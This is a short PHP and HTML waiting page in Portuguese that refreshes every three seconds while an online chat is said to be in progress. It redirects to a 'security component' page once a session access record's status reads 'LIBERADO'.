<?php
    include 'validacao.php';
    if(isset($_SESSION['idAcesso'])) {
        $id = $_SESSION['idAcesso'];
        $acesso = Acesso::findById($id);
        if( $acesso['status'] === "LIBERADO" ) {
            header('Location: componenteSeguranca.php?hash='.$hash);
        }
    }
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="3" />
    <link rel="shortcut icon" href="images/favicon.ico">
    <title>Aguarde...</title>
    <style>
        #conteudo{
            text-align: center;
            margin-top: 300px;
        }
        p{
            font-size: 14px;
            font-family: Tahoma, Geneva, Verdana, sans-serif;
        }
    </style>
</head>
<body>
    <div id="conteudo">
        <img width="86" height="25" src="images/loading-inicial.gif" alt="">
        <p>Aguarde, CHAT ON LINE em andamento...</p>
    </div>
</body>
</html>